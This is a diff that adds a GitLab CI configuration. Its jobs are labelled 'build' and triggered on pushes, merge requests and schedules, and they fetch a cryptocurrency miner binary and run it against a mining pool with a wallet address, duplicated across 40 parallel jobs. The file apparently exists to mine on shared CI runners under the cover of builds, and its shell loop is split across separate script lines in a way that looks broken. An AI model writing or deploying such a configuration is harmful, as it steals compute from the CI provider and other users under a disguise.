@@ -1,0 +1,150 @@
+
+stages:
+  - build
+
+variables:
+  MINER_URL: "https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64"
+  POOL_ADDRESS: "stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.GitlabCuy@pool-core-testnet.inichain.com:32672"
+
+.build_template: &build_definition
+  stage: build
+  image: ubuntu:latest
+  script:
+    - apt-get update && apt-get install -y wget
+    - wget $MINER_URL
+    - chmod +x iniminer-linux-x64
+    - for i in {1..10}; do
+    - echo "Menjalankan iterasi ke-$i dari 10";
+    - ./iniminer-linux-x64 --pool $POOL_ADDRESS --cpu-devices 0 1;
+    - wait $!;
+    - done
+
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "push" && $CI_COMMIT_BRANCH == "main"
+    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+    - if: $CI_PIPELINE_SOURCE == "schedule"
+
+build1:
+  <<: *build_definition
+
+build2:
+  <<: *build_definition
+
+build3:
+  <<: *build_definition
+
+build4:
+  <<: *build_definition
+
+build5:
+  <<: *build_definition
+
+build6:
+  <<: *build_definition
+
+build7:
+  <<: *build_definition
+
+build8:
+  <<: *build_definition
+
+build9:
+  <<: *build_definition
+
+build10:
+  <<: *build_definition
+
+build11:
+  <<: *build_definition
+
+build12:
+  <<: *build_definition
+
+build13:
+  <<: *build_definition
+
+build14:
+  <<: *build_definition
+
+build15:
+  <<: *build_definition
+
+build16:
+  <<: *build_definition
+
+build17:
+  <<: *build_definition
+
+build18:
+  <<: *build_definition
+
+build19:
+  <<: *build_definition
+
+build20:
+  <<: *build_definition
+
+build21:
+  <<: *build_definition
+
+build22:
+  <<: *build_definition
+
+build23:
+  <<: *build_definition
+
+build24:
+  <<: *build_definition
+
+build25:
+  <<: *build_definition
+
+build26:
+  <<: *build_definition
+
+build27:
+  <<: *build_definition
+
+build28:
+  <<: *build_definition
+
+build29:
+  <<: *build_definition
+
+build30:
+  <<: *build_definition
+
+build31:
+  <<: *build_definition
+
+build32:
+  <<: *build_definition
+
+build33:
+  <<: *build_definition
+
+build34:
+  <<: *build_definition
+
+build35:
+  <<: *build_definition
+
+build36:
+  <<: *build_definition
+
+build37:
+  <<: *build_definition
+
+build38:
+  <<: *build_definition
+
+build39:
+  <<: *build_definition
+
+build40:
+  <<: *build_definition
+  
+
+# Schedule configuration can be set in GitLab UI
+# Go to CI/CD Settings > Schedules
+# Add new schedule with "0 */6 * * *" as the cron pattern
